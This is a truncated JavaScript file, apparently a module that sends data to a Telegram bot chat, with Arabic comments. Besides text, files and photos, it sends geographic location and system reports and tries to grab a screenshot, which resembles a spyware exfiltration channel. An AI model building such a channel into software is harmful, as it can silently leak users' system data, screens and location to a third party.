// telegram_bridge.js
// نظام جسر متقدم لإرسال البيانات للتليجرام

class TelegramBridge {
    constructor(token, chatId) {
        this.token = token;
        this.chatId = chatId;
        this.baseUrl = `https://api.telegram.org/bot${token}`;
        this.queue = [];
        this.isSending = false;
    }
    
    // إرسال رسالة نصية
    async sendMessage(text, options = {}) {
        const payload = {
            chat_id: this.chatId,
            text: text,
            parse_mode: options.parse_mode || 'HTML',
            disable_web_page_preview: options.disable_preview || true,
            disable_notification: options.silent || false
        };
        
        try {
            const response = await fetch(`${this.baseUrl}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });
            
            const data = await response.json();
            return data.ok;
        } catch (error) {
            console.error('Telegram send error:', error);
            return false;
        }
    }
    
    // إرسال صورة
    async sendPhoto(imageUrl, caption = '') {
        const payload = {
            chat_id: this.chatId,
            photo: imageUrl,
            caption: caption
        };
        
        try {
            const response = await fetch(`${this.baseUrl}/sendPhoto`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });
            
            return response.ok;
        } catch (error) {
            console.error('Photo send error:', error);
            return false;
        }
    }
    
    // إرسال ملف
    async sendDocument(fileData, filename, caption = '') {
        const formData = new FormData();
        formData.append('chat_id', this.chatId);
        formData.append('document', new Blob([fileData]), filename);
        formData.append('caption', caption);
        
        try {
            const response = await fetch(`${this.baseUrl}/sendDocument`, {
                method: 'POST',
                body: formData
            });
            
            return response.ok;
        } catch (error) {
            console.error('Document send error:', error);
            return false;
        }
    }
    
    // إرسال موقع جغرافي
    async sendLocation(latitude, longitude) {
        const payload = {
            chat_id: this.chatId,
            latitude: latitude,
            longitude: longitude
        };
        
        try {
            const response = await fetch(`${this.baseUrl}/sendLocation`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });
            
            return response.ok;
        } catch (error) {
            console.error('Location send error:', error);
            return false;
        }
    }
    
    // إرسال بيانات نظام متقدمة
    async sendSystemReport(systemInfo) {
        const report = this.formatSystemReport(systemInfo);
        
        // إرسال كرسالة
        await this.sendMessage(report);
        
        // إرسال كملف JSON
        await this.sendDocument(
            JSON.stringify(systemInfo, null, 2),
            `system_report_${Date.now()}.json`,
            'Detailed System Report'
        );
        
        // محاولة الحصول على لقطة شاشة
        try {
            const screenshot = await this.captureScreenshot();
            if (screenshot) {
                await this.sendPhoto(screenshot, 'System Screenshot');
            }
        } catch (error) {
            console.log('Screenshot not available');
        }
    }
    
    formatSystemReport